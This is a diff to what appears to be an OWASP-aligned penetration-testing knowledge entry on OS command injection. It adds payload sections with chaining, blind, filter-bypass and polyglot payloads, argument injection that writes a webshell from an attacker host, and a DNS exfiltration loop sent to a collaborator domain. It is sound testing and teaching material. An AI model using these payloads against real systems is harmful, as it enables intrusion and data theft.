@@ -8,8 +8,8 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
 severity_boost: {}
 ---
 
@@ -374,6 +374,75 @@ w"h"o"am"i
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Basic chaining
+curl -s "https://{target}/api/ping?host=127.0.0.1;id"
+curl -s "https://{target}/api/ping?host=127.0.0.1|id"
+curl -s "https://{target}/api/ping?host=127.0.0.1%26%26id"
+
+# Blind time-based
+time curl -s "https://{target}/api/ping?host=127.0.0.1;sleep+5"
+
+# Out-of-band via Burp Collaborator / interactsh
+curl -s "https://{target}/api/ping?host=127.0.0.1;curl+http://{collaborator-id}.oastify.com"
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | Direct command chaining | `uid=` and `gid=` in response |
+| `; sleep 5` | Blind time-based | Response delayed ~5s vs baseline |
+| `;${IFS}id` / `;$IFS$9id` | Space-filter bypass | `uid=` present despite space filtering |
+| `; nslookup {collaborator}` | Out-of-band (OOB) | DNS/HTTP callback received on listener |
+
+### Extra Filter-Bypass Techniques (no-space / no-slash / char-filtering)
+
+```bash
+# No-space bypass alternatives
+cat${IFS}/etc/passwd
+cat<{target}                # input redirection
+{cat,/etc/passwd}           # brace expansion
+X=$'uname\x20-a'&&$X        # ANSI-C quoting
+;ls%09-al%09/home           # tab (%09) instead of space
+
+# Quote / backtick fragmentation (defeats naive "contains ; | &" filters)
+w'h'o'am'i
+w"h"o"am"i
+wh``oami
+
+# No slash/backslash bypass (build "/" from $HOME)
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+
+# Hex/base64 obfuscated path reconstruction
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+
+# Wildcard/case bypass (Windows)
+powershell C:\*\*2\n??e*d.*?      # notepad via glob
+wHoAmi                             # case-insensitive cmd.exe
+
+# Polyglot payload (works across quote contexts: none / ' / ")
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+```
+
+### Argument Injection
+
+When only extra arguments can be appended (not a new command), abuse dangerous flags of the invoked binary — see the [Argument Injection Vectors](https://sonarsource.github.io/argument-injection-vectors/) reference for a per-binary catalogue:
+
+```bash
+curl http://{attacker}/ -o webshell.php     # write output to a file via -o
+ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
+psql -o'|id>/tmp/foo'
+```
+
+### DNS-Based Blind Exfiltration
+
+```bash
+for i in $(ls /); do host "$i.$(openssl rand -hex 6).{collaborator}"; done
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -432,6 +501,13 @@ if (preg_match('/^[a-zA-Z0-9.-]+$/', $_GET['host'])) {
 | ---------- | ----------------------------------------------------------------- |
 | **CWE-78** | Improper Neutralization of Special Elements used in an OS Command |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-12: Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
+- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 
 ---
 
